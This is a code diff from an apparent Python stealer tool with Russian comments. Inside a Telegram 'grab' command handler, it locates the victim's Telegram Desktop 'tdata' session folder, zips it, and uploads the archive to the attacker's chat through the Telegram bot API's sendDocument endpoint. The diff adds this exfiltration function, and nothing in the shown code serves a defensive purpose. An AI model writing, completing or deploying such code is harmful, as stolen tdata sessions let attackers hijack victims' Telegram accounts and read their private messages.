@@ -305,7 +305,8 @@ def archive_and_send2():
             output_zip = os.path.join(temp_dir, 'Mraks_By_sx180')
             created_zip = create_zip_archive(source_dir, output_zip)  # Передаём аргумент output_zip
             if created_zip:
-                send_file_to_telegram(created_zip, 'Mraks_By_sx180.zip')  # Добавляем аргумент file_name
+                file_data = {'file_path': created_zip, 'file_name': 'Mraks_By_sx180.zip'}
+                send_file_to_telegram(file_data)  # Передаем словарь с данными
             else:
                 print("Failed to create or send zip file.")
         except Exception as e:
@@ -314,13 +315,14 @@ def archive_and_send2():
         print("Папка 'tdata' не найдена.")
 
 def handle_tg_grab_command(message):
-    def send_message_to_group(chat_id):
-        system_name = platform.system()  # Определение системного имени
-        url = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"
-        data = {'chat_id': chat_id, 'text': f"System Name: {system_name}\n"}
-        response = requests.post(url, data=data)
-    
-
+    def send_file_to_telegram(file_data):
+        url = f'https://api.telegram.org/bot{telegram_bot_token}/sendDocument'
+        files = {'document': (file_data['file_name'], open(file_data['file_path'], 'rb'))}
+        data = {'chat_id': chat_id}
+        response = requests.post(url, files=files, data=data)
+        if response.status_code != 200:
+            print(f"Error sending file to Telegram. Chat ID: {chat_id}. Status code: {response.status_code}")
+            print(response.text)
     def archive_and_send2():
         user = os.path.expanduser("~")
         if os.path.exists(user + "\\AppData\\Roaming\\Telegram Desktop\\tdata"):
